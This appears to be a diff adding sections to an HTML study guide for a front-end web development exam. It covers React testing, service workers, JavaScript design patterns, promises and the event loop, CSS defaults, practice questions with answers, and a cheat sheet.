+  <li><code>getBy...</code> — throws if not found</li>
+  <li><code>queryBy...</code> — returns null if not found (use for "should NOT exist" tests)</li>
+  <li><code>findBy...</code> — async, waits for element to appear</li>
+</ul>
+
+<h4 class="g-h4">Example — full React Testing Library test of a button component</h4>
+<div class="cb"><pre>// ── The component under test ──────────────────────────────────────────────
+// LikeButton.tsx
+import { useState } from 'react';
+
+export function LikeButton({ initialCount = 0 }: { initialCount?: number }) {
+  const [count, setCount] = useState(initialCount);
+  return (
+    &lt;button onClick={() =&gt; setCount(c =&gt; c + 1)}&gt;
+      Like ({count})
+    &lt;/button&gt;
+  );
+}
+
+// ── The test file ─────────────────────────────────────────────────────────
+// LikeButton.test.tsx
+import { render, screen } from '@testing-library/react';
+import userEvent from '@testing-library/user-event';
+import { LikeButton } from './LikeButton';
+
+describe('LikeButton', () =&gt; {
+  it('shows initial count', () =&gt; {
+    render(&lt;LikeButton initialCount={5} /&gt;);
+    // getByRole is preferred — uses accessible role + name
+    expect(screen.getByRole('button', { name: /like \(5\)/i })).toBeInTheDocument();
+  });
+
+  it('increments count when clicked', async () =&gt; {
+    const user = userEvent.setup();  // userEvent simulates real browser events
+    render(&lt;LikeButton /&gt;);
+
+    const btn = screen.getByRole('button', { name: /like \(0\)/i });
+    await user.click(btn);
+    await user.click(btn);
+
+    // After two clicks the text should update
+    expect(screen.getByRole('button', { name: /like \(2\)/i })).toBeInTheDocument();
+    // Confirm the old text is gone
+    expect(screen.queryByText('Like (0)')).not.toBeInTheDocument();
+  });
+
+  it('does not render a disabled button by default', () =&gt; {
+    render(&lt;LikeButton /&gt;);
+    expect(screen.getByRole('button')).not.toBeDisabled();
+  });
+});</pre></div>
+
+<h2 class="g-h2">16. Service Workers / PWA Basics</h2>
+
+<h3 class="g-h3">Service Workers</h3>
+
+<p>A Service Worker is a JavaScript file that runs in the background, separate from the web page. It acts as a <strong>programmable network proxy</strong>.</p>
+
+<p><strong>Key capabilities:</strong></p>
+<ul>
+  <li>Intercept and cache network requests (offline support)</li>
+  <li>Background sync</li>
+  <li>Push notifications</li>
+</ul>
+
+<div class="cb"><pre>// Register a service worker
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js');
+}
+
+// In sw.js — intercept fetches and respond from cache
+self.addEventListener('fetch', (event) =&gt; {
+  event.respondWith(
+    caches.match(event.request).then((cached) =&gt; {
+      return cached || fetch(event.request);
+    })
+  );
+});</pre></div>
+
+<h4 class="g-h4">Example — Service Worker registration with lifecycle hooks</h4>
+<div class="cb"><pre>// ── main.js (runs on the page) ────────────────────────────────────────────
+if ('serviceWorker' in navigator) {
+  window.addEventListener('load', async () =&gt; {
+    try {
+      const registration = await navigator.serviceWorker.register('/sw.js', {
+        scope: '/',  // controls which paths the SW intercepts (defaults to SW file location)
+      });
+      console.log('SW registered, scope:', registration.scope);
+    } catch (err) {
+      console.error('SW registration failed:', err);
+    }
+  });
+}
+
+// ── sw.js (runs in the Service Worker background thread) ──────────────────
+const CACHE_NAME = 'my-app-v1';
+const PRECACHE_URLS = ['/', '/index.html', '/main.css', '/main.js'];
+
+// 1. Install — cache static assets
+self.addEventListener('install', (event) =&gt; {
+  event.waitUntil(
+    caches.open(CACHE_NAME).then((cache) =&gt; cache.addAll(PRECACHE_URLS))
+  );
+  self.skipWaiting(); // activate immediately without waiting
+});
+
+// 2. Activate — delete old caches
+self.addEventListener('activate', (event) =&gt; {
+  event.waitUntil(
+    caches.keys().then((keys) =&gt;
+      Promise.all(keys.filter(k =&gt; k !== CACHE_NAME).map(k =&gt; caches.delete(k)))
+    )
+  );
+  self.clients.claim(); // take control of open pages immediately
+});
+
+// 3. Fetch — serve from cache, fall back to network (Cache-First strategy)
+self.addEventListener('fetch', (event) =&gt; {
+  event.respondWith(
+    caches.match(event.request).then((cached) =&gt; cached || fetch(event.request))
+  );
+});</pre></div>
+
+<p><strong>Service Worker lifecycle:</strong></p>
+<ol>
+  <li>Register</li>
+  <li>Install (cache assets)</li>
+  <li>Activate (clear old caches)</li>
+  <li>Fetch (intercept requests)</li>
+</ol>
+
+<h3 class="g-h3">PWA (Progressive Web App)</h3>
+
+<p>A PWA is a web app that behaves like a native app:</p>
+<ul>
+  <li><strong>Installable</strong> (appears on home screen)</li>
+  <li><strong>Offline capable</strong> (via Service Worker + Cache API)</li>
+  <li><strong>Push notifications</strong></li>
+  <li><strong>Responsive design</strong></li>
+</ul>
+
+<p><strong>Required for PWA:</strong></p>
+<ul>
+  <li>HTTPS</li>
+  <li>Web App Manifest (<code>manifest.json</code>)</li>
+  <li>Service Worker</li>
+</ul>
+
+<div class="cb"><pre>// manifest.json
+{
+  "name": "My PWA",
+  "short_name": "PWA",
+  "start_url": "/",
+  "display": "standalone",
+  "background_color": "#ffffff",
+  "icons": [...]
+}</pre></div>
+
+<h2 class="g-h2">17. Topics Not Covered Elsewhere</h2>
+
+<p>After scanning all 15 practice exams, the following topics appear but are NOT covered in the other 7 study guide areas (CSS, JS/TS, React, State, Next.js, Forms, Socket.io):</p>
+
+<h3 class="g-h3">JavaScript Design Patterns (Practice Exam 11)</h3>
+
+<p>These patterns appeared in exam 11 and may appear on the final:</p>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Pattern</th>
+      <th>Key Idea</th>
+      <th>Real-world analogy</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Factory</strong></td>
+      <td>Interface for creating objects; subclasses decide which class to instantiate</td>
+      <td>A car factory that produces Cars or Trucks based on input</td>
+    </tr>
+    <tr>
+      <td><strong>Singleton</strong></td>
+      <td>Only ONE instance ever created; shared across app</td>
+      <td>A plain JS object literal is already a singleton</td>
+    </tr>
+    <tr>
+      <td><strong>Decorator</strong></td>
+      <td>Add behavior to an existing object dynamically</td>
+      <td>Adding milk/sugar to coffee (base coffee unchanged)</td>
+    </tr>
+    <tr>
+      <td><strong>Facade</strong></td>
+      <td>Simple API hiding complex underlying code</td>
+      <td>jQuery's <code>$.hide()</code> hides DOM manipulation complexity</td>
+    </tr>
+    <tr>
+      <td><strong>Flyweight</strong></td>
+      <td>Separate data into shared (intrinsic) and unique (extrinsic) parts to save memory</td>
+      <td>30 copies of one book — store book data once, checkout data 30 times</td>
+    </tr>
+    <tr>
+      <td><strong>Observer/Pub-Sub</strong></td>
+      <td>Objects subscribe to events; publishers notify all subscribers</td>
+      <td>Redux is heavily dependent on Observer pattern</td>
+    </tr>
+    <tr>
+      <td><strong>Mediator</strong></td>
+      <td>Central hub that all objects communicate through</td>
+      <td>Reduces N*(N-1) connections to N connections</td>
+    </tr>
+    <tr>
+      <td><strong>Iterator</strong></td>
+      <td>Traverse a collection without exposing its structure</td>
+      <td><code>$.each()</code> in jQuery</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Observer pattern core operations:</strong></p>
+<ol>
+  <li><code>subscribe</code> — register interest in an event</li>
+  <li><code>publish</code> — broadcast notification to all subscribers</li>
+  <li><code>unsubscribe</code> — remove a subscription</li>
+</ol>
+
+<p><strong>Observer pros/cons:</strong></p>
+<ul>
+  <li>Pro: Loosely coupled modules</li>
+  <li>Con: Hard to trace data flow, publishers don't know if subscribers fail</li>
+</ul>
+
+<p><strong>Decorator pattern — MacBook cost example:</strong></p>
+
+<div class="cb"><pre>var mb = new MacBook();    // cost: 997
+Memory(mb);                 // cost: 997 + 75 = 1072
+Insurance(mb);              // cost: 1072 + 250 = 1322
+mb.cost()                   // → 1322</pre></div>
+
+<h3 class="g-h3">DOM Events Deep Dive (Practice Exam 7)</h3>
+
+<p><strong>Four parts of an event:</strong></p>
+<ol>
+  <li><strong>Event type</strong> — string describing what happened (<code>'click'</code>, <code>'input'</code>)</li>
+  <li><strong>Event target</strong> — element associated with the event</li>
+  <li><strong>Event object</strong> — object passed to handler with info about the event</li>
+  <li><strong>Event handler</strong> — function that runs when event fires</li>
+</ol>
+
+<p><strong>Event object properties (from slides):</strong></p>
+<ul>
+  <li><code>event.target</code> — element that triggered the event</li>
+  <li><code>event.type</code> — type of event (e.g., <code>'mousedown'</code>)</li>
+  <li><code>event.bubbles</code> — boolean, whether event bubbles</li>
+</ul>
+
+<p><strong>Event registration methods:</strong></p>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Method</th>
+      <th>Pro</th>
+      <th>Con</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>element.onclick = fn</code></td>
+      <td>Simple</td>
+      <td>Only ONE handler (overwrites previous)</td>
+    </tr>
+    <tr>
+      <td><code>element.addEventListener('click', fn)</code></td>
+      <td>Multiple handlers</td>
+      <td>None</td>
+    </tr>
+    <tr>
+      <td><code>element.attachEvent('onclick', fn)</code></td>
+      <td>IE-specific</td>
+      <td>Non-standard</td>
+    </tr>
+    <tr>
+      <td><code>&lt;button onclick="fn()"&gt;</code></td>
+      <td>Simple</td>
+      <td>"Dirty HTML", cluttered</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Event bubbling:</strong> Events propagate from target up through ancestors to document. Use for event delegation (one listener on parent handles all children).</p>
+
+<h3 class="g-h3">CSS Animations (Practice Exam 13)</h3>
+
+<p>Animation shorthand order (8 values):</p>
+
+<div class="cb"><pre>animation: [name] [duration] [timing-function] [delay] [iteration-count] [direction] [fill-mode] [play-state]
+
+animation: myAnimation 5s ease-in 2s 10 reverse backwards running;</pre></div>
+
+<p><strong>animation-direction values:</strong> <code>normal</code>, <code>reverse</code>, <code>alternate</code><br>
+<strong>animation-fill-mode values:</strong> <code>forwards</code>, <code>backwards</code>, <code>both</code><br>
+<strong>animation-play-state values:</strong> <code>paused</code>, <code>running</code></p>
+
+<p><strong>Media query types (from slides):</strong> <code>screen</code>, <code>print</code>, <code>speech</code>, <code>all</code><br>
+(NOT: <code>mobile</code>, <code>desktop</code>, <code>tablet</code> — these do NOT exist)</p>
+
+<h3 class="g-h3">Promise States (Practice Exam 12)</h3>
+
+<p>A Promise is in one of three states:</p>
+<ol>
+  <li><strong>pending</strong> — initial state</li>
+  <li><strong>fulfilled</strong> — operation completed successfully</li>
+  <li><strong>rejected</strong> — operation failed</li>
+</ol>
+
+<p>A settled Promise (fulfilled OR rejected) can <strong>never change state again</strong>.</p>
+
+<div class="cb"><pre>// Promise executor runs SYNCHRONOUSLY
+const p = new Promise((resolve, reject) =&gt; {
+  console.log('X');  // prints FIRST (sync)
+  resolve('Y');
+  console.log('Z');  // prints SECOND (sync — resolve doesn't stop execution!)
+});
+p.then(val =&gt; console.log(val));  // prints FOURTH (microtask)
+console.log('W');                  // prints THIRD (sync)
+// Output: X, Z, W, Y</pre></div>
+
+<p><strong><code>.finally()</code> receives NO arguments</strong> — it runs regardless of outcome but gets no value.</p>
+
+<h3 class="g-h3">for await...of vs Promise.all</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th></th>
+      <th><code>Promise.all</code></th>
+      <th><code>for await...of</code></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Concurrency</td>
+      <td>All run at once</td>
+      <td>All start at once, results awaited sequentially</td>
+    </tr>
+    <tr>
+      <td>Timing</td>
+      <td>Resolves when SLOWEST finishes</td>
+      <td>Processes results in INPUT ORDER</td>
+    </tr>
+    <tr>
+      <td>Rejection</td>
+      <td>Short-circuits immediately</td>
+      <td>Stops at first rejection</td>
+    </tr>
+    <tr>
+      <td>Use case</td>
+      <td>Get all results together</td>
+      <td>Process results as they arrive, in order</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">BEM Deep Dive (Practice Exam 4)</h3>
+
+<p><strong>Block naming:</strong> lowercase Latin letters, digits, and dashes (NO underscores)<br>
+<strong>Element naming:</strong> lowercase Latin letters, digits, dashes, and underscores<br>
+<strong>Modifier naming:</strong> lowercase Latin letters, digits, dashes, and underscores</p>
+<p>Blocks use <strong>class name selectors ONLY</strong> — no tag names, no IDs.<br>
+Modifier is an <strong>extra class</strong> added to the block/element DOM node.</p>
+
+<h3 class="g-h3">CSS Variables Deep Dive (Practice Exam 4)</h3>
+
+<div class="cb"><pre>// Read a CSS variable via JS
+const value = getComputedStyle(element).getPropertyValue('--my-var');
+
+// Set a CSS variable via JS
+element.style.setProperty('--my-var', newValue);</pre></div>
+
+<p><code>@property</code> at-rule: "Be more expressive with definition of a custom property with the ability to associate a type, set default values, and control inheritance"</p>
+<p>Custom properties with <code>--</code> always <strong>inherit</strong> the value of parent. <code>@property</code> with <code>inherits: false</code> uses the <code>initial-value</code> instead of the parent's value.</p>
+
+<h3 class="g-h3">Tailwind CSS (Practice Exam 4)</h3>
+
+<ul>
+  <li>"A utility-first CSS framework"</li>
+  <li>Conditional styles: <code>hover:bg-red-500</code>, <code>md:flex</code>, <code>dark:text-white</code></li>
+  <li>No context switching (write styles directly in markup)</li>
+  <li>No naming fatigue (class names are predefined)</li>
+  <li>Removing component removes its styles too</li>
+</ul>
+
+<h3 class="g-h3">TypeScript Compilation (Practice Exam 10 &amp; 15)</h3>
+
+<p>Two things happen during compilation:</p>
+<ol>
+  <li><strong>Type annotations stripped out</strong> — browsers can't handle TS</li>
+  <li><strong>Template literals → <code>concat()</code></strong> — TypeScript targets ES3 by default</li>
+</ol>
+
+<p><code>noImplicitAny</code>: When enabled, you MUST explicitly state <code>any</code> type; TypeScript won't allow implicit <code>any</code>.</p>
+<p>Structural type system: TypeScript checks if an object has the required shape. Extra properties are fine; missing required properties fail.</p>
+
+<div class="cb"><pre>// This PASSES — point3d has x and y (plus extra z)
+const point3d = { x: 1, y: 2, z: 3 };
+logPoint(point3d); // OK
+
+// This FAILS — animal has no x or y
+const animal = { type: 'cow', name: 'Fred' };
+logPoint(animal); // ERROR</pre></div>
+
+<h2 class="g-h2">18. Key Defaults &amp; Must-Memorize Tables</h2>
+
+<h3 class="g-h3">The Complete Defaults Table</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Property/Setting</th>
+      <th>Default Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td><code>flex-direction</code></td><td><code>row</code></td></tr>
+    <tr><td><code>flex-wrap</code></td><td><code>nowrap</code></td></tr>
+    <tr><td><code>justify-content</code></td><td><code>flex-start</code></td></tr>
+    <tr><td><code>align-items</code></td><td><code>stretch</code></td></tr>
+    <tr><td><code>align-content</code></td><td><code>stretch</code></td></tr>
+    <tr><td><code>align-self</code></td><td><code>auto</code></td></tr>
+    <tr><td><code>flex-grow</code></td><td><code>0</code> (do NOT grow)</td></tr>
+    <tr><td><code>flex-shrink</code></td><td><code>1</code> (do shrink)</td></tr>
+    <tr><td><code>flex-basis</code></td><td><code>auto</code></td></tr>
+    <tr><td><code>order</code></td><td><code>0</code></td></tr>
+    <tr><td><code>grid-auto-flow</code></td><td><code>row</code></td></tr>
+    <tr><td><code>transform-origin</code></td><td><code>50% 50%</code> (center)</td></tr>
+    <tr><td><code>perspective-origin</code></td><td><code>50% 50%</code> (center)</td></tr>
+    <tr><td><code>background-repeat</code></td><td><code>repeat</code></td></tr>
+    <tr><td><code>box-sizing</code></td><td><code>content-box</code></td></tr>
+    <tr><td><code>linear-gradient direction</code></td><td><code>top to bottom</code></td></tr>
+    <tr><td><code>radial-gradient direction</code></td><td><code>inner to outer</code></td></tr>
+    <tr><td><code>useEffect with []</code></td><td>runs once on mount</td></tr>
+    <tr><td><code>useEffect with no array</code></td><td>runs every render</td></tr>
+    <tr><td><code>useRef initial value</code></td><td>must pass it: <code>useRef(null)</code></td></tr>
+    <tr><td><code>react-hook-form mode</code></td><td><code>"onSubmit"</code></td></tr>
+    <tr><td><code>Next.js components</code></td><td>Server Components</td></tr>
+    <tr><td><code>Zustand persist storage</code></td><td><code>localStorage</code></td></tr>
+    <tr><td><code>fetch credentials</code></td><td><code>"same-origin"</code></td></tr>
+    <tr><td><code>SameSite cookie</code></td><td><code>Lax</code> (modern browsers default)</td></tr>
+    <tr><td><code>tabindex default</code></td><td><code>-1</code> for non-interactive elements</td></tr>
+    <tr><td><code>Promise executor</code></td><td>Runs SYNCHRONOUSLY</td></tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">HTTP Status Code Quick Reference</h3>
+
+<div class="cb"><pre>2xx Success:    200 OK, 201 Created, 204 No Content
+3xx Redirect:   301 Permanent, 302 Temporary
+4xx Client:     400 Bad Request, 401 Unauth, 403 Forbidden, 404 Not Found, 409 Conflict
+5xx Server:     500 Internal Server Error</pre></div>
+
+<h3 class="g-h3">fetch() Critical Facts</h3>
+
+<div class="cb"><pre>fetch() → resolves to Response
+response.json() → resolves to data (MUST await)
+response.ok → true if 200-299
+404/500 → RESOLVES (not rejected!)
+network error → REJECTS</pre></div>
+
+<h3 class="g-h3">Promise Methods Summary</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Method</th>
+      <th>Resolves when</th>
+      <th>Rejects when</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>Promise.all()</code></td>
+      <td>ALL resolve</td>
+      <td>ANY rejects (short-circuit)</td>
+    </tr>
+    <tr>
+      <td><code>Promise.race()</code></td>
+      <td>FIRST settles (resolve or reject)</td>
+      <td>FIRST rejects</td>
+    </tr>
+    <tr>
+      <td><code>Promise.any()</code></td>
+      <td>FIRST resolves</td>
+      <td>ALL reject (AggregateError)</td>
+    </tr>
+    <tr>
+      <td><code>Promise.allSettled()</code></td>
+      <td>ALL settle</td>
+      <td>Never</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p>Memory tricks:</p>
+<ul>
+  <li><strong>all</strong> = strict teacher: one failure = everyone fails</li>
+  <li><strong>race</strong> = first across the line wins (even if they trip)</li>
+  <li><strong>any</strong> = optimist: first success is enough</li>
+  <li><strong>allSettled</strong> = patient: waits for every single one</li>
+</ul>
+
+<h3 class="g-h3">Event Loop Execution Order</h3>
+
+<div class="cb"><pre>1. Call Stack (synchronous code)
+2. ALL Microtasks (Promise .then/.catch, queueMicrotask)
+3. ONE Macrotask (setTimeout, setInterval, DOM events)
+4. Return to step 2</pre></div>
+
+<div class="cb"><pre>console.log('1'); // sync
+setTimeout(() =&gt; console.log('2'), 0); // macrotask
+Promise.resolve().then(() =&gt; console.log('3')); // microtask
+console.log('4'); // sync
+// Output: 1, 4, 3, 2</pre></div>
+
+<h3 class="g-h3">this Binding Rules</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>How called</th>
+      <th><code>this</code> =</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Regular call (no new)</td>
+      <td><code>window</code></td>
+    </tr>
+    <tr>
+      <td><code>new Fn()</code></td>
+      <td>New instance</td>
+    </tr>
+    <tr>
+      <td><code>obj.method()</code></td>
+      <td><code>obj</code></td>
+    </tr>
+    <tr>
+      <td><code>.call(x)</code> or <code>.apply(x)</code></td>
+      <td><code>x</code></td>
+    </tr>
+    <tr>
+      <td><code>.bind(x)</code></td>
+      <td><code>x</code> (PERMANENT, can't override)</td>
+    </tr>
+    <tr>
+      <td><code>setTimeout(fn)</code></td>
+      <td><code>window</code></td>
+    </tr>
+    <tr>
+      <td>Arrow function</td>
+      <td>Lexical scope (inherits)</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h2 class="g-h2">19. Likely Exam Questions</h2>
+
+<p>These question patterns have appeared in practice exams and are likely on the final:</p>
+
+<h3 class="g-h3">Multiple Choice</h3>
+
+<p>1. What does <code>fetch()</code> return when it receives a 404 response?</p>
+<ul>
+  <li><strong>A) A resolved Promise with <code>response.ok === false</code></strong> ← correct</li>
+  <li>B) A rejected Promise</li>
+  <li>C) Throws an error</li>
+  <li>D) Returns null</li>
+</ul>
+
+<p>2. What is the correct order of execution?</p>
+
+<div class="cb"><pre>console.log('A');
+setTimeout(() =&gt; console.log('B'), 0);
+Promise.resolve().then(() =&gt; console.log('C'));
+console.log('D');</pre></div>
+
+<ul>
+  <li><strong>A) A, D, C, B</strong> ← correct</li>
+  <li>B) A, B, C, D</li>
+  <li>C) A, D, B, C</li>
+  <li>D) A, B, D, C</li>
+</ul>
+
+<p>3. Which status code should an API return when creating a new resource successfully?</p>
+<ul>
+  <li>A) 200</li>
+  <li><strong>B) 201</strong> ← correct</li>
+  <li>C) 204</li>
+  <li>D) 301</li>
+</ul>
+
+<p>4. What is the difference between 401 and 403?</p>
+<ul>
+  <li><strong>401 = not authenticated, 403 = authenticated but not authorized</strong></li>
+</ul>
+
+<p>5. Which Web Storage API stores data that persists after the browser is closed?</p>
+<ul>
+  <li><strong>localStorage</strong> (sessionStorage is cleared when tab closes)</li>
+</ul>
+
+<h3 class="g-h3">Fill in the Blank</h3>
+
+<ol>
+  <li><code>fetch()</code> resolves to a ________ object. → <code>Response</code></li>
+  <li>To check if a fetch was successful, check <code>response.________</code>. → <code>ok</code></li>
+  <li><code>response.json()</code> must be ________ because it returns a Promise. → <code>awaited</code></li>
+  <li>The HTTP method that Server Actions use is ________. → <code>POST</code></li>
+  <li>CORS preflight uses the HTTP method ________. → <code>OPTIONS</code></li>
+  <li><code>localStorage</code> stores data as ________ only. → <code>strings</code> (JSON.stringify needed for objects)</li>
+  <li>Custom element tag names must contain a ________. → <code>hyphen</code></li>
+  <li>Web Workers communicate via ________. → <code>postMessage()</code></li>
+  <li>The <code>dragover</code> event must call ________ or dropping won't work. → <code>preventDefault()</code></li>
+  <li>401 means ________, 403 means ________. → <code>not authenticated</code>, <code>not authorized</code></li>
+</ol>
+
+<h3 class="g-h3">Select All That Apply</h3>
+
+<p>1. Which are true about Web Workers?</p>
+<ul>
+  <li>[x] Run on a separate thread</li>
+  <li>[x] Communicate via postMessage()</li>
+  <li>[x] Can make fetch() requests</li>
+  <li>[x] Useful for CPU-intensive tasks</li>
+  <li>[ ] Can access the DOM — <strong>FALSE</strong></li>
+  <li>[ ] Share memory with main thread — <strong>FALSE</strong> (by default)</li>
+</ul>
+
+<p>2. Which are true about localStorage?</p>
+<ul>
+  <li>[x] Persists after browser close</li>
+  <li>[x] ~5MB storage limit</li>
+  <li>[x] Same-origin only</li>
+  <li>[x] Use JSON.stringify/parse for objects</li>
+  <li>[ ] Sent with HTTP requests — <strong>FALSE</strong></li>
+  <li>[ ] sessionStorage also persists — <strong>FALSE</strong></li>
+</ul>
+
+<p>3. Which are correct about CORS?</p>
+<ul>
+  <li>[x] Preflight uses OPTIONS method</li>
+  <li>[x] <code>Access-Control-Allow-Origin: *</code> cannot be used with credentials</li>
+  <li>[x] A network error (CORS block) causes fetch() to reject</li>
+  <li>[ ] fetch() rejects on 404 — <strong>FALSE</strong></li>
+  <li>[ ] All requests trigger preflight — <strong>FALSE</strong> (only non-simple)</li>
+</ul>
+
+<h3 class="g-h3">Essay / Code Analysis</h3>
+
+<p><strong>Q: Identify two bugs and fix this code:</strong></p>
+
+<div class="cb"><pre>async function loadUserData(userId: string) {
+  const response = await fetch(`/api/users/${userId}`);
+  const data = response.json(); // BUG 1
+  return data.name.toUpperCase();
+}</pre></div>
+
+<ul>
+  <li>Bug 1: <code>response.json()</code> is not awaited — returns Promise, not data</li>
+  <li>Bug 2: No error handling — 404 or network errors crash silently</li>
+</ul>
+
+<p><strong>Q: Explain XSS and how to prevent it.</strong></p>
+<ul>
+  <li>XSS = injecting malicious script into pages other users view</li>
+  <li>Prevention: use <code>textContent</code> not <code>innerHTML</code>, sanitize input, CSP headers, HttpOnly cookies</li>
+</ul>
+
+<p><strong>Q: What is the difference between 401 and 403?</strong></p>
+<ul>
+  <li>401 Unauthorized: not authenticated (no valid session/token)</li>
+  <li>403 Forbidden: authenticated but lacks permission for this resource</li>
+</ul>
+
+<h2 class="g-h2">20. Cheat Sheet</h2>
+
+<h3 class="g-h3">HTTP Methods (REST)</h3>
+
+<div class="cb"><pre>GET    → read      (safe, idempotent)
+POST   → create    (not idempotent)
+PUT    → replace   (idempotent)
+PATCH  → partial   (not idempotent)
+DELETE → delete    (idempotent)</pre></div>
+
+<h3 class="g-h3">Status Codes (memorize)</h3>
+
+<div class="cb"><pre>200 OK | 201 Created | 204 No Content
+301 Permanent | 302 Temporary
+400 Bad | 401 No Auth | 403 Forbidden | 404 Not Found | 409 Conflict
+500 Server Error</pre></div>
+
+<h3 class="g-h3">fetch() Mental Model</h3>
+
+<div class="cb"><pre>fetch(url)                     // → Promise&lt;Response&gt;
+  .then(r =&gt; {
+    if (!r.ok) throw new Error(r.status);  // 404/500 don't auto-reject!
+    return r.json();           // → Promise (MUST await!)
+  })
+  .then(data =&gt; data)
+  .catch(err =&gt; /* network error OR throw above */);</pre></div>
+
+<h3 class="g-h3">CORS Preflight Trigger Checklist</h3>
+
+<ul>
+  <li>[ ] Method is PUT, DELETE, PATCH?</li>
+  <li>[ ] Custom headers like <code>Authorization</code> or <code>Content-Type: application/json</code>?</li>
+  <li>[ ] Credentials mode set?</li>
+</ul>
+<p>→ If any YES: browser sends OPTIONS preflight first</p>
+
+<h3 class="g-h3">Storage Decision Tree</h3>
+
+<div class="cb"><pre>Need to survive browser close? → localStorage
+Need to clear on tab close?    → sessionStorage
+Need to send to server?        → Cookie
+HttpOnly (no JS access)?       → Cookie with HttpOnly</pre></div>
+
+<h3 class="g-h3">ARIA Quick Reference</h3>
+
+<div class="cb"><pre>role="button"           → it's a button
+aria-label="Close"      → accessible name (no visible text)
+aria-expanded="false"   → collapsible state
+aria-hidden="true"      → hide from screen readers
+aria-live="polite"      → announce updates
+tabindex="0"            → include in tab order
+tabindex="-1"           → focusable but not in tab order</pre></div>
+
+<h3 class="g-h3">Promise Resolution Cheat Sheet</h3>
+
+<div class="cb"><pre>.all()        → all resolve   OR   ANY rejects (fast-fail)
+.race()       → first settles (resolve OR reject)
+.any()        → first resolves OR ALL reject (AggregateError)
+.allSettled() → all settle   (NEVER rejects)</pre></div>
+
+<h3 class="g-h3">Event Loop Priority</h3>
+
+<div class="cb"><pre>Sync → Microtasks (ALL) → Macrotask (ONE) → Microtasks (ALL) → ...</pre></div>
+
+<h3 class="g-h3">Security Quick Reference</h3>
+
+<div class="cb"><pre>XSS:  Inject JS into page. Fix: textContent, sanitize, CSP, HttpOnly
+CSRF: Trick browser to make request. Fix: CSRF token, SameSite=Strict</pre></div>
+
+<h3 class="g-h3">Web Components Must-Know</h3>
+
+<div class="cb"><pre>customElements.define('tag-name', ClassName)  // tag MUST have hyphen
+connectedCallback()    // element added to DOM
+disconnectedCallback() // element removed from DOM
+attributeChangedCallback(name, old, new)  // observed attribute changed
+this.attachShadow({ mode: 'open' })  // encapsulated styles</pre></div>
+
+<h3 class="g-h3">Web Worker Rules</h3>
+
+<div class="cb"><pre>✓ Runs on background thread
+✓ communicates via postMessage()
+✓ Can use fetch()
+✗ NO DOM access
+✗ NO direct memory sharing (by default)</pre></div>
+
+<h3 class="g-h3">Drag and Drop Minimum Setup</h3>
+
+<div class="cb"><pre>// MUST have: draggable="true" + dragstart + dragover + drop
+element.addEventListener('dragover', e =&gt; e.preventDefault()); // REQUIRED!</pre></div>
+
+<p><em>This guide covers every topic from glossary section H and all miscellaneous topics from the 15 practice exams. Topics not covered elsewhere include: JS Design Patterns, CSS Animations shorthand, Media Query types, Promise states, BEM deep dive, CSS variable JS manipulation, and TypeScript compilation details.</em></p>
